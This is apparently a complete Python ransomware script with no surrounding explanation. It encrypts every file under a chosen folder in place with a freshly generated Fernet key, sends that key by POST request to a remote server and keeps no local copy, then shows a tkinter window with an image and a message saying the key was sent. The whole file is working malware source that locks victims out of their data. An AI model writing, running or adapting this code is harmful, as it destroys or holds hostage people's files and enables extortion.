import os
import requests
from cryptography.fernet import Fernet
import tkinter as tk
from PIL import Image, ImageTk

# Generate a key for encryption
key = Fernet.generate_key()

# Create a Fernet object with the key
f = Fernet(key)

# Define the folder to encrypt
folder_to_encrypt = '/path/to/folder'

# Walk through all the files in the folder and encrypt them
for root, dirs, files in os.walk(folder_to_encrypt):
    for filename in files:
        # Open the file to encrypt
        with open(os.path.join(root, filename), 'rb') as f_in:
            # Read the contents of the file
            data = f_in.read()

        # Encrypt the contents of the file
        encrypted_data = f.encrypt(data)

        # Write the encrypted contents back to the file
        with open(os.path.join(root, filename), 'wb') as f_out:
            f_out.write(encrypted_data)

# Convert the key to bytes
key_bytes = bytes(key)

# Send the encryption key to a remote server with a POST request
response = requests.post('https://example.com/encryption_key', data=key_bytes)

# Create a tkinter window
root = tk.Tk()

# Set the size and title of the window
root.geometry('400x400')
root.title('Encryption Key Sent')

# Load the image to display
image = Image.open('path/to/image.jpg')
image = image.resize((400, 400), Image.ANTIALIAS)
photo = ImageTk.PhotoImage(image)

# Create a label to display the image
label = tk.Label(root, image=photo)
label.pack()

# Create a label to display the message
if response.status_code == 200:
    message = 'Encryption key sent successfully.'
else:
    message = 'Failed to send encryption key.'
message_label = tk.Label(root, text=message)
message_label.pack()

# Start the tkinter event loop
root.mainloop()
